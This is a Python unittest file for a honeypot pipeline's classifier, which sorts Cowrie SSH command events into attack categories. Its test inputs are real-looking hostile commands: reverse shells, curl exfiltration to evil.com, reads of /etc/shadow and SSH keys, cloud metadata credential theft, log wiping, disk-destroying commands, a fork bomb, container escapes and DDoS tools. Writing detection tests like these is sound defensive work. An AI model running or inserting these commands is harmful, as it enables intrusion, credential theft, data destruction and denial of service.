from __future__ import annotations

import unittest

from honeypot_pipeline.classification import classify_event
from honeypot_pipeline.cowrie import normalize_cowrie_event
from honeypot_pipeline.records import build_event_record


def _make_command_event(command: str) -> dict:
    """Helper: normalize a cowrie.command.input event with the given command."""
    return normalize_cowrie_event(
        {
            "eventid": "cowrie.command.input",
            "protocol": "ssh",
            "src_ip": "198.51.100.42",
            "input": command,
        }
    )


def _make_lifecycle_event(eventid: str) -> dict:
    """Helper: normalize a non-command Cowrie lifecycle/metadata event."""
    return normalize_cowrie_event(
        {
            "eventid": eventid,
            "protocol": "ssh",
            "src_ip": "192.168.1.32",
        }
    )


class ClassificationTests(unittest.TestCase):
    # ── Existing categories (regression) ──────────────────────────────

    def test_classifies_login_activity_as_brute_force(self) -> None:
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.login.failed",
                "protocol": "ssh",
                "src_ip": "203.0.113.10",
            }
        )
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "brute_force")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_download_commands_as_malware_download(self) -> None:
        event = _make_command_event("wget http://bad.example.com/payload.sh")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "malware_download")
        self.assertEqual(classification["severity"], "high")

    def test_reconnaissance_detected(self) -> None:
        event = _make_command_event("whoami")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reconnaissance")

    def test_persistence_detected(self) -> None:
        event = _make_command_event("echo 'key' >> ~/.ssh/authorized_keys")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "persistence")

    # ── New category: privilege_escalation ────────────────────────────

    def test_classifies_sudo_l_as_privilege_escalation(self) -> None:
        event = _make_command_event("sudo -l")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_suid_search_as_privilege_escalation(self) -> None:
        event = _make_command_event("find / -perm -4000 -type f 2>/dev/null")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    def test_classifies_sudoers_reading_as_privilege_escalation(self) -> None:
        event = _make_command_event("cat /etc/sudoers")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    def test_classifies_getcap_as_privilege_escalation(self) -> None:
        event = _make_command_event("getcap -r / 2>/dev/null")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    # ── New category: credential_access ───────────────────────────────

    def test_classifies_shadow_read_as_credential_access(self) -> None:
        event = _make_command_event("cat /etc/shadow")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_id_rsa_read_as_credential_access(self) -> None:
        event = _make_command_event("cat ~/.ssh/id_rsa")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")

    def test_classifies_bash_history_scraping_as_credential_access(self) -> None:
        event = _make_command_event("cat ~/.bash_history | tail -20")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")

    def test_classifies_grep_password_as_credential_access(self) -> None:
        event = _make_command_event("grep -r password /etc/ 2>/dev/null")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")

    # ── New category: cryptomining ────────────────────────────────────

    def test_classifies_xmrig_as_cryptomining(self) -> None:
        event = _make_command_event("/tmp/xmrig --url=pool.example.com:4444 --user=x --pass=x")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_stratum_pool_as_cryptomining(self) -> None:
        event = _make_command_event("./minerd -o stratum+tcp://pool.example.com:3333 -u wallet -p x")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")

    def test_classifies_cryptonight_algo_as_cryptomining(self) -> None:
        event = _make_command_event("./cpuminer --algo=cryptonight --url=pool.example.com:5555")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")

    # ── New category: obfuscation ─────────────────────────────────────

    def test_classifies_base64_decode_as_obfuscation(self) -> None:
        event = _make_command_event("echo 'd2hvYW1p' | base64 -d")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "obfuscation")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_eval_as_obfuscation(self) -> None:
        event = _make_command_event("eval $(echo 'aWQK' | base64 -d)")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "obfuscation")

    def test_classifies_sh_c_as_obfuscation(self) -> None:
        event = _make_command_event("sh -c 'echo dW5hbWUgLWEK | base64 -d | sh'")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "obfuscation")

    # ── New category: defense_evasion ─────────────────────────────────

    def test_classifies_log_clearing_as_defense_evasion(self) -> None:
        event = _make_command_event("truncate -s 0 /var/log/syslog")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_history_clearing_as_defense_evasion(self) -> None:
        event = _make_command_event("history -c")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    def test_classifies_unset_histfile_as_defense_evasion(self) -> None:
        event = _make_command_event("unset HISTFILE")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    def test_classifies_truncate_log_as_defense_evasion(self) -> None:
        event = _make_command_event("truncate -s 0 /var/log/syslog")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    # ── New category: destructive_action ──────────────────────────────

    def test_classifies_rm_rf_as_destructive(self) -> None:
        event = _make_command_event("rm -rf /var/log/*")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_mkfs_as_destructive(self) -> None:
        event = _make_command_event("mkfs.ext4 /dev/sda1")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    def test_classifies_dd_zero_as_destructive(self) -> None:
        event = _make_command_event("dd if=/dev/zero of=/tmp/.wipe bs=1M count=10")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    def test_classifies_fork_bomb_as_destructive(self) -> None:
        event = _make_command_event(":(){ :|:& };:")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    # ── Precedence tests ──────────────────────────────────────────────

    def test_destructive_beats_generic_command_execution(self) -> None:
        """High-confidence specific categories must beat the generic fallback."""
        event = _make_command_event("rm -rf /tmp/*")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "destructive_action")

    def test_cryptomining_beats_command_execution(self) -> None:
        event = _make_command_event("/tmp/xmrig --donate-level=1")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "cryptomining")

    def test_privilege_escalation_beats_command_execution(self) -> None:
        event = _make_command_event("sudo -l 2>/dev/null")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    def test_credential_access_beats_command_execution(self) -> None:
        event = _make_command_event("cat /etc/shadow 2>/dev/null | head -5")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "credential_access")

    def test_destructive_beats_defense_evasion_for_rm_rf_var_log(self) -> None:
        """rm -rf /var/log/* should be destructive_action, not defense_evasion."""
        event = _make_command_event("rm -rf /var/log/*")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    # ── Session / connection lifecycle events (no command) ────────────

    def test_session_connect_is_connection(self) -> None:
        event = _make_lifecycle_event("cowrie.session.connect")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "connection")
        self.assertEqual(classification["severity"], "low")

    def test_direct_tcpip_request_is_connection_medium(self) -> None:
        event = _make_lifecycle_event("cowrie.direct-tcpip.request")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "connection")
        self.assertEqual(classification["severity"], "medium")

    def test_session_closed_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.session.closed")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")
        self.assertEqual(classification["severity"], "low")

    def test_session_params_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.session.params")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_log_closed_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.log.closed")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_client_var_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.client.var")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_client_version_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.client.version")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_login_still_beats_session_mapping(self) -> None:
        """A login event carries 'session'-like data but must stay brute_force."""
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.login.failed",
                "protocol": "ssh",
                "src_ip": "203.0.113.10",
                "session": "abc123",
            }
        )
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "brute_force")

    def test_command_input_not_treated_as_session(self) -> None:
        """A command.input event with a command must classify on the command."""
        event = _make_command_event("ls -la")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "command_execution")

    def test_truly_unknown_event_stays_unknown(self) -> None:
        event = _make_lifecycle_event("cowrie.something.weird")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "unknown")

    # ── Regression: existing categories still work ────────────────────

    def test_build_record_includes_indicators_and_classification(self) -> None:
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.command.input",
                "protocol": "ssh",
                "src_ip": "198.51.100.24",
                "input": "whoami",
            }
        )
        record = build_event_record(event)
        self.assertEqual(record["indicators"]["ip_addresses"], ["198.51.100.24"])
        self.assertEqual(record["classification"]["attack_category"], "reconnaissance")
        self.assertEqual(record["risk"]["level"], "low")

    def test_unrecognized_command_falls_back_to_command_execution(self) -> None:
        event = _make_command_event("echo hello world")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["severity"], "medium")

    # ── New categories added 2025 ─────────────────────────────────────

    # reverse_shell

    def test_classifies_bash_dev_tcp_as_reverse_shell(self) -> None:
        event = _make_command_event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reverse_shell")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_nc_e_as_reverse_shell(self) -> None:
        event = _make_command_event("nc -e /bin/bash 10.0.0.1 4444")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reverse_shell")

    def test_classifies_python_socket_as_reverse_shell(self) -> None:
        event = _make_command_event("python -c 'import socket,subprocess,os;s=socket.socket()'")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reverse_shell")

    def test_classifies_mkfifo_reverse_shell(self) -> None:
        event = _make_command_event("mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reverse_shell")

    def test_reverse_shell_beats_obfuscation_for_dev_tcp(self) -> None:
        """Reverse shell with /dev/tcp must classify as reverse_shell, not obfuscation."""
        event = _make_command_event("sh -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reverse_shell")

    # cloud_metadata_access

    def test_classifies_aws_metadata_curl_as_cloud_metadata(self) -> None:
        event = _make_command_event("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cloud_metadata_access")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_gcp_metadata_as_cloud_metadata(self) -> None:
        event = _make_command_event("curl metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cloud_metadata_access")

    def test_classifies_aliyun_metadata_as_cloud_metadata(self) -> None:
        event = _make_command_event("curl http://100.100.100.200/latest/meta-data/")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cloud_metadata_access")

    # data_exfiltration

    def test_classifies_curl_post_as_data_exfil(self) -> None:
        event = _make_command_event("curl -X POST -d @/etc/passwd http://evil.com/collect")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "data_exfiltration")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_ngrok_as_data_exfil(self) -> None:
        event = _make_command_event("./ngrok tcp 22")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "data_exfiltration")

    def test_classifies_chisel_as_data_exfil(self) -> None:
        event = _make_command_event("./chisel client evil.com:8080 R:1080:socks")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "data_exfiltration")

    # lateral_movement

    def test_classifies_sshpass_as_lateral_movement(self) -> None:
        event = _make_command_event("sshpass -p 'admin' ssh root@10.0.1.5")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "lateral_movement")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_ssh_keyscan_as_lateral_movement(self) -> None:
        event = _make_command_event("ssh-keyscan 10.0.1.0/24 >> ~/.ssh/known_hosts")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "lateral_movement")

    def test_classifies_rsync_as_lateral_movement(self) -> None:
        event = _make_command_event("rsync -avz /data/ root@10.0.1.5:/backup/")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "lateral_movement")

    # network_scan

    def test_classifies_nmap_as_network_scan(self) -> None:
        event = _make_command_event("nmap -sV 10.0.1.0/24")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "network_scan")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_masscan_as_network_scan(self) -> None:
        event = _make_command_event("masscan 10.0.0.0/8 -p22,80,443 --rate=1000")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "network_scan")

    def test_classifies_nc_scan_as_network_scan(self) -> None:
        event = _make_command_event("nc -zv 10.0.1.5 22")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "network_scan")

    # container_escape

    def test_classifies_docker_sock_as_container_escape(self) -> None:
        event = _make_command_event("docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine cat /host/etc/shadow")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "container_escape")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_docker_privileged_as_container_escape(self) -> None:
        event = _make_command_event("docker run -v /:/host --privileged alpine sh")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "container_escape")

    def test_classifies_nsenter_as_container_escape(self) -> None:
        event = _make_command_event("nsenter -t 1 -m -u -i -n -p sh")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "container_escape")

    # Expanded markers for existing categories

    def test_classifies_kinsing_as_cryptomining(self) -> None:
        event = _make_command_event("./kinsing -pool pool.minexmr.com:4444")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")

    def test_classifies_kdevtmpfsi_as_cryptomining(self) -> None:
        event = _make_command_event("chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")

    def test_classifies_setenforce_as_defense_evasion(self) -> None:
        event = _make_command_event("setenforce 0")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    def test_classifies_iptables_flush_as_defense_evasion(self) -> None:
        event = _make_command_event("iptables -F")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    def test_classifies_lsblk_as_reconnaissance(self) -> None:
        event = _make_command_event("lsblk")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reconnaissance")

    def test_classifies_lscpu_as_reconnaissance(self) -> None:
        event = _make_command_event("lscpu")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reconnaissance")

    # Precedence: cloud_metadata beats credential_access for 169.254

    def test_cloud_metadata_beats_credential_access(self) -> None:
        """A curl to metadata containing 'credentials' should be cloud_metadata, not credential_access."""
        event = _make_command_event("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cloud_metadata_access")

    # Precedence: data_exfil beats download for ngrok

    def test_data_exfil_beats_download_for_curl_post(self) -> None:
        """curl -X POST should be data_exfil, not malware_download."""
        event = _make_command_event("curl -X POST -d @/tmp/data http://evil.com/collect")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "data_exfiltration")

    # ── DDoS ─────────────────────────────────────────────────────────────

    def test_classifies_hping3_flood_as_ddos(self) -> None:
        event = _make_command_event("hping3 --flood -S -p 80 203.0.113.50")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "ddos")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_slowloris_as_ddos(self) -> None:
        event = _make_command_event("slowloris 203.0.113.50 80")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "ddos")

    def test_classifies_goldeneye_as_ddos(self) -> None:
        event = _make_command_event("goldeneye 203.0.113.50 80")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "ddos")

    def test_classifies_synflood_as_ddos(self) -> None:
        event = _make_command_event("python3 synflood.py 203.0.113.50 80")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "ddos")

    def test_classifies_stresser_as_ddos(self) -> None:
        event = _make_command_event("/tmp/stresser --target 203.0.113.50 --port 80")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "ddos")

    def test_classifies_botnet_command_as_ddos(self) -> None:
        event = _make_command_event("nohup /tmp/botnet --connect c2.example.com &")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "ddos")

    def test_classifies_ntp_amplification_as_ddos(self) -> None:
        event = _make_command_event("python3 amp.py --type ntp amplify 203.0.113.50")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "ddos")

    def test_ddos_beats_command_execution(self) -> None:
        """hping3 must classify as ddos, not generic command_execution."""
        event = _make_command_event("hping3 --flood -S -p 443 203.0.113.50")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "ddos")

    def test_ddos_does_not_fire_on_empty_command(self) -> None:
        """No DDoS marker present → must not classify as ddos."""
        event = _make_command_event("whoami")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "ddos")


if __name__ == "__main__":
    unittest.main()
